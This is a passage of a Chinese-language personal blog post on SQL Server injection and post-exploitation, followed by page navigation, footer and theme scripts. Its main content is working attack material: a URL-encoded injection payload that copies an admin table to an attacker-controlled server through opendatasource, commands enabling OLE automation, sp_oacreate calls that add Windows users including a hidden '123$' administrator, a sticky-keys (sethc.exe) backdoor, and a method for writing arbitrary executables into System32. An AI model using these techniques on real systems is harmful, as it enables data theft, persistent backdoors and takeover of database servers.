+<p><img src="/2021/06/25/sqlserver/18.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/18.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="18"></p>
+<p>类似的还有opendatasource函数等函数。但用法有一点点区别。<br> 实现功能:<br>   获取所有库.当前库所有表.表里所有内容.分区路径.<br>本机建立库和表,方便反弹时写进东西.<br><code>insert into opendatasource(&#39;sqloledb&#39;,&#39;server=mssql服务器地址（）,端口; uid=账号;pwd=密码;database=数据库名&#39;).数据库名.dbo.表名 select * from admin</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：%27%20;%20insert%20into%20opendatasource(%27sqloledb%27,%27server=XX.xx.xx.xx,1433;uid=sa;<span class="built_in">pwd</span>=xxxxxxxxx;database=<span class="built_in">test</span>%27).test.dbo.%20test%20select%20*%20from%20admin--+</span><br></pre></td></tr></table></figure>
+<p>函数外的.test.dbo.test表示连接成功后，test数据库，dbo是权限，下个test是我建的表，再后面是查询的被攻击的数据表.<br>注意：此处需要知道admin的字段数，因为test表需要和admin表字段数一致，创建的表需要和目标表的字段数相同，或者把*换成想要的字段。</p>
+<h2 id="4、sp-oacreate（没有回显，可以把系统命令执行的结果echo到一个txt。暂时没研究出能不能插进表里）"><a href="#4、sp-oacreate（没有回显，可以把系统命令执行的结果echo到一个txt。暂时没研究出能不能插进表里）" class="headerlink" title="4、sp_oacreate（没有回显，可以把系统命令执行的结果echo到一个txt。暂时没研究出能不能插进表里）"></a>4、sp_oacreate（没有回显，可以把系统命令执行的结果echo到一个txt。暂时没研究出能不能插进表里）</h2><p>利用sp_oacreate进行写exe和执行命令：在xp_cmdshell被删除或者出错情况下，可以充分利用SP_OACreate进行提权</p>
+<p>sp_oacreate可以删除、复制、移动文件，还能配合sp_oamethod来写文件执行cmd。<br>sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言，换言之就是xp_cmdshell能执行的sp_oacreate＋sp_oamethod同样能胜任。但是使用此方法时sp_oacreate没有回显，所以一般用于xp_cmdshell无法使用时.</p>
+<p>开启:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;ole automation procedures&#x27;</span>,1;reconfigure;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/19.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/19.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="19"></p>
+<p>关闭：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;ole automation procedures&#x27;</span>,0;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,0;reconfigure;</span><br></pre></td></tr></table></figure>
+<h3 id="1-调用cmd-来执行命令"><a href="#1-调用cmd-来执行命令" class="headerlink" title="1.调用cmd 来执行命令"></a>1.调用cmd 来执行命令</h3><p>添加用户：wscript.shell执行命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @shell int <span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@shell output <span class="built_in">exec</span> sp_oamethod @shell,<span class="string">&#x27;run&#x27;</span>,null,<span class="string">&#x27;c:\windows\system32\cmd.exe /c net user asd 1qaz@WSX /add&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/20.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/20.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="20"></p>
+<p>Shell.Application执行命令：没成功，命令执行了但是没结果，暂时没有研究是啥问题。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @o int <span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;Shell.Application&#x27;</span>, @o out <span class="built_in">exec</span> sp_oamethod  @o, <span class="string">&#x27;ShellExecute&#x27;</span>,null, <span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;cmd /c net user &gt;c:\test.txt&#x27;</span>,<span class="string">&#x27;c:\windows\system32&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/25/sqlserver/21.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/21.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="21"></p>
+<h3 id="2、写入启动项："><a href="#2、写入启动项：" class="headerlink" title="2、写入启动项："></a>2、写入启动项：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @sp_passwordxieo int, @f int, @t int, @ret int</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, @sp_passwordxieo out</span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @sp_passwordxieo, <span class="string">&#x27;createtextfile&#x27;</span>, @f out, <span class="string">&#x27;d:\RECYCLER\1.vbs&#x27;</span>, 1</span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;set wsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;Set ob=GetObject(os)&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;Set od=ob.Create(&quot;user&quot;,&quot;123$&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;od.SetPassword &quot;123&quot;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;od.SetInfo&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;Set of=GetObject(os&amp;&quot;/123$&quot;,user)&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> @ret = sp_oamethod @f, <span class="string">&#x27;writeline&#x27;</span>, NULL,<span class="string">&#x27;oe.add os&amp;&quot;/123$&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、粘贴键替换"><a href="#3、粘贴键替换" class="headerlink" title="3、粘贴键替换"></a>3、粘贴键替换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @o int</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, @o out </span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @o, <span class="string">&#x27;copyfile&#x27;</span>,null,<span class="string">&#x27;c:\windows\explorer.exe&#x27;</span> ,<span class="string">&#x27;c:\windows\system32\sethc.exe&#x27;</span>;</span><br><span class="line"><span class="built_in">declare</span> @o int</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, @o out </span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @o, <span class="string">&#x27;copyfile&#x27;</span>,null,<span class="string">&#x27;c:\windows\system32\sethc.exe&#x27;</span> ,<span class="string">&#x27;c:\windows\system32\dllcache\sethc.exe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>需要同时具备sp_oacreate 和sp_oamethod 两个功能组件.</p>
+<h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @result int</span><br><span class="line"><span class="built_in">declare</span> @fso_token int</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, @fso_token out</span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @fso_token,<span class="string">&#x27;deletefile&#x27;</span>,null,<span class="string">&#x27;c:\1.txt&#x27;</span></span><br><span class="line"><span class="built_in">exec</span> sp_oadestroy @fso_token</span><br></pre></td></tr></table></figure>
+
+<h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @o int</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>,@o out</span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @o,<span class="string">&#x27;copyfile&#x27;</span>,null,<span class="string">&#x27;c:\1.txt&#x27;</span>,<span class="string">&#x27;c:\2.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">declare</span> @o int</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>,@o out</span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @o,<span class="string">&#x27;movefile&#x27;</span>,null,<span class="string">&#x27;c:\1.txt&#x27;</span>,<span class="string">&#x27;c:\3.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4、直接写入文件到对方计算机-此处的文件可以是exe-dll-等-注-此方法不支持文件大于64KB"><a href="#4、直接写入文件到对方计算机-此处的文件可以是exe-dll-等-注-此方法不支持文件大于64KB" class="headerlink" title="4、直接写入文件到对方计算机,此处的文件可以是exe, dll,等.(注,此方法不支持文件大于64KB)"></a>4、直接写入文件到对方计算机,此处的文件可以是exe, dll,等.(注,此方法不支持文件大于64KB)</h3><p>将这个文件转成HEX代码：我这里用一个在线转换的网站：<code>http://www.tomeko.net/online_tools/file_to_hex.php?lang=en</code><br><img src="/2021/06/25/sqlserver/22.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/22.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="22"></p>
+<p>然后用以下方法写入到对方计算机中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @ObjectToken INT</span><br><span class="line">EXEC sp_OACreate <span class="string">&#x27;ADODB.Stream&#x27;</span>, @ObjectToken OUTPUT</span><br><span class="line">EXEC sp_OASetProperty @ObjectToken, <span class="string">&#x27;Type&#x27;</span>, 1</span><br><span class="line">EXEC sp_OAMethod @ObjectToken, <span class="string">&#x27;Open&#x27;</span></span><br><span class="line">EXEC sp_OAMethod @ObjectToken, <span class="string">&#x27;Write&#x27;</span>, NULL, 0x123456(其中0x123456为HEX内容而且不能换行)</span><br><span class="line"></span><br><span class="line">EXEC sp_OAMethod @ObjectToken, <span class="string">&#x27;SaveToFile&#x27;</span>, NULL, <span class="string">&#x27;Test.exe(文件名)&#x27;</span>, 2</span><br><span class="line">EXEC sp_OAMethod @ObjectToken, <span class="string">&#x27;Close&#x27;</span></span><br><span class="line">EXEC sp_OADestroy @ObjectToken</span><br></pre></td></tr></table></figure>
+<p>写入的路径：C:\Windows\System32\Test.exe<br>写入之后, 就发挥你的办法去执行你写入的这个文件就OK了。<br><img src="/2021/06/25/sqlserver/23.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/23.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="23"><br><img src="/2021/06/25/sqlserver/24.png" class="lazyload" data-srcset="/2021/06/25/sqlserver/24.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="24"></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2021/06/25/sqlserver/>http://example.com/2021/06/25/sqlserver/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-25T13:48:04+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年6月25日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/sqlserver%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>sqlserver注入执行命令</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/06/25/sqlserver/&title=sqlserver注入执行命令和写入exe的一些方法技巧 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/06/25/sqlserver/&title=sqlserver注入执行命令和写入exe的一些方法技巧 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/06/25/sqlserver/&title=sqlserver注入执行命令和写入exe的一些方法技巧 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/06/23/oracle/'>
+          <p class='title'>oracle注入<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>oracle的数据库实例：Oracle数据库的基本单位，等同于Mysql中的库
+数据库实例名是用于和操作系统进行联系的标识，就是说数据库和操作系统之间的交互用的是数据库实例名。实例名也被写入参数...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+
+
+
+</div>
+<aside class='l_side'>
+  
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%BC%80%E5%90%AFxp-cmdshell"><span class="toc-text">1、开启xp_cmdshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%86%99%E5%85%A5exe"><span class="toc-text">2、写入exe:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#certutil%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E5%8F%8A%E5%90%8E%E7%BC%80%E9%99%90%E5%88%B6%EF%BC%9A"><span class="toc-text">certutil突破上传文件大小及后缀限制：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8xp-cmdshell%E6%89%A7%E8%A1%8Cexe"><span class="toc-text">3.利用xp_cmdshell执行exe:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%9Axp-cmdshell%E4%B8%80%E8%88%AC%E6%83%85%E5%86%B5%E4%B8%8B%E6%98%AF%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84"><span class="toc-text">执行命令：xp_cmdshell一般情况下是有回显的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8sqlserver-openrowset%EF%BC%88%E4%B8%8D%E9%9C%80%E8%A6%81%E9%AB%98%E6%9D%83%E9%99%90%EF%BC%89%E6%8A%8A%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%93%E6%9E%9C%E8%BD%AC%E5%8F%91%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84sqlserver%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%EF%BC%9A%E4%B8%8D%E8%BF%87%E8%BF%99%E4%B8%AA%E5%8F%AA%E8%83%BD%E7%94%A8%E4%BA%8E%E7%9B%AE%E6%A0%87sqlserver%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%83%BD%E8%BF%9E%E4%B8%8A%E8%87%AA%E5%B7%B1sqlserver%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E5%A4%A7%E6%A6%82%E5%B0%B1%E6%98%AF%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%87%BA%E7%BD%91%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%BD%86%E5%8F%88%E6%B2%A1%E5%9B%9E%E6%98%BE%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%94%A8%E4%BA%86"><span class="toc-text">也可以利用sqlserver openrowset（不需要高权限）把执行的结果转发到自己的sqlserver服务器上：不过这个只能用于目标sqlserver服务器能连上自己sqlserver服务器的情况，大概就是目标服务器出网的情况，但又没回显就可以用了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%A4%E8%BE%B9%E5%88%9B%E5%BB%BA%E4%B8%B4%E6%97%B6%E8%A1%A8%EF%BC%9A"><span class="toc-text">两边创建临时表：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81sp-oacreate%EF%BC%88%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%8A%8A%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%BB%93%E6%9E%9Cecho%E5%88%B0%E4%B8%80%E4%B8%AAtxt%E3%80%82%E6%9A%82%E6%97%B6%E6%B2%A1%E7%A0%94%E7%A9%B6%E5%87%BA%E8%83%BD%E4%B8%8D%E8%83%BD%E6%8F%92%E8%BF%9B%E8%A1%A8%E9%87%8C%EF%BC%89"><span class="toc-text">4、sp_oacreate（没有回显，可以把系统命令执行的结果echo到一个txt。暂时没研究出能不能插进表里）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B0%83%E7%94%A8cmd-%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">1.调用cmd 来执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9%EF%BC%9A"><span class="toc-text">2、写入启动项：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E7%B2%98%E8%B4%B4%E9%94%AE%E6%9B%BF%E6%8D%A2"><span class="toc-text">3、粘贴键替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6"><span class="toc-text">删除文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-text">复制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E6%96%87%E4%BB%B6"><span class="toc-text">移动文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E5%88%B0%E5%AF%B9%E6%96%B9%E8%AE%A1%E7%AE%97%E6%9C%BA-%E6%AD%A4%E5%A4%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%8F%AF%E4%BB%A5%E6%98%AFexe-dll-%E7%AD%89-%E6%B3%A8-%E6%AD%A4%E6%96%B9%E6%B3%95%E4%B8%8D%E6%94%AF%E6%8C%81%E6%96%87%E4%BB%B6%E5%A4%A7%E4%BA%8E64KB"><span class="toc-text">4、直接写入文件到对方计算机,此处的文件可以是exe, dll,等.(注,此方法不支持文件大于64KB)</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="sqlserver注入执行命令和写入exe的一些方法技巧";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+          
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2017-2020 XXX</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
